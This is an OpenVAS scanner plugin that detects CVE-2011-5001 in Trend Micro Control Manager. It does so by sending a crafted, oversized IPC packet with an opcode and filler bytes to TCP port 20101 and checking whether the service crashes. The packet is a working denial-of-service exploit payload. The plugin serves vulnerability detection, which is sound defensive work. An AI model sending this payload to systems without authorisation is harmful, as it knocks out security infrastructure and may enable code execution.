###############################################################################
# OpenVAS Vulnerability Test
#
# Trend Micro Control Manager 'CmdProcessor.exe' Buffer Overflow Vulnerability
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (C) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802876");
  script_version("2022-04-27T12:01:52+0000");
  script_cve_id("CVE-2011-5001");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"2022-04-27 12:01:52 +0000 (Wed, 27 Apr 2022)");
  script_tag(name:"creation_date", value:"2012-07-02 17:04:06 +0530 (Mon, 02 Jul 2012)");
  script_name("Trend Micro Control Manager 'CmdProcessor.exe' Buffer Overflow Vulnerability");

  script_xref(name:"URL", value:"http://secunia.com/advisories/47114");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/50965");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/71681");
  script_xref(name:"URL", value:"http://www.securitytracker.com/id?1026390");
  script_xref(name:"URL", value:"http://www.zerodayinitiative.com/advisories/ZDI-11-345");
  script_xref(name:"URL", value:"http://www.trendmicro.com/ftp/documentation/readme/readme_critical_patch_TMCM55_1613.txt");

  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Buffer overflow");
  script_dependencies("find_service.nasl", "httpver.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 443, 20101);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to cause buffer overflow
  condition or execute arbitrary code.");

  script_tag(name:"affected", value:"Trend Micro Control Manager version 5.5 Build 1250 Hotfix 1550 and prior");

  script_tag(name:"insight", value:"The 'CGenericScheduler::AddTask' function in cmdHandlerRedAlertController.dll
  in 'CmdProcessor.exe' fails to process a specially crafted IPC packet sent on
  TCP port 20101, which could be exploited by remote attackers to cause a buffer overflow.");

  script_tag(name:"solution", value:"Apply Critical Patch Build 1613 for Trend Micro Control Manager 5.5.");

  script_tag(name:"summary", value:"Trend Micro Control Manager is prone to a buffer overflow vulnerability.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");

cmdPort = 20101;
if(!get_port_state(cmdPort))
  exit(0);

soc = open_sock_tcp(cmdPort);
if(!soc)
  exit(0);

close(soc);

tmcmport = http_get_port(default:443);

req = http_get(item:"/WebApp/Login.aspx", port:tmcmport);
res = http_keepalive_send_recv(port: tmcmport, data: req);

if(res && ">Control Manager" >< res && "Trend Micro Incorporated" >< res)
{
  header = raw_string(0x00, 0x00, 0x13, 0x88,                        ## Buffer Size
                      crap(data:raw_string(0x41), length: 9),        ## Junk data
                      0x15, 0x09, 0x13, 0x00, 0x00, 0x00,            ## Opcode
                      crap(data:raw_string(0x41), length: 25),       ## Junk data
                      0xfe, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
                      0xff, 0xff, 0xf4, 0xff, 0xff, 0xff, 0x41);

  tmp = raw_string(crap(data:raw_string(0x41), length: 32000));
  exploit = header + tmp + tmp + tmp + tmp + tmp;

  soc = open_sock_tcp(cmdPort);
  if(!soc){
    exit(0);
  }

  send(socket:soc, data: exploit);
  close(soc);

  sleep(5);
  soc2 = open_sock_tcp(cmdPort);
  if(!soc2)
  {
    security_message(port:cmdPort);
    exit(0);
  }
  close(soc2);
}

exit(99);
